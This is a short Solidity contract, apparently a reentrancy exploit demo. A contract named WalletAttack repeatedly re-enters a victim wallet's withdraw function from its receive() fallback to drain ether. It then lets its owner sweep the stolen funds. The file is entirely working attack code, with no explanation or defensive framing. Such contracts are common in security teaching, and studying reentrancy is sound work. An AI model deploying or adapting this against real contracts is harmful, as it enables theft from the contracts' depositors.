// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IWallet {
    function deposit(address) external payable;
    function balanceOf(address) external view returns (uint);
    function withdraw(uint) external;
}

contract WalletAttack {
    IWallet public victim;
    address public owner;
    uint256 public counter = 0;

    constructor (IWallet _victim) {
        victim = _victim;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "only Owner!");
        victim.withdraw(1 ether);
    }

    function withdraw() external returns (bool success){
        require(msg.sender == owner, "only Owner!");
        (success, ) = msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {        
        if(address(victim).balance > 2 ether){
            victim.withdraw(1 ether);
        }
    }

}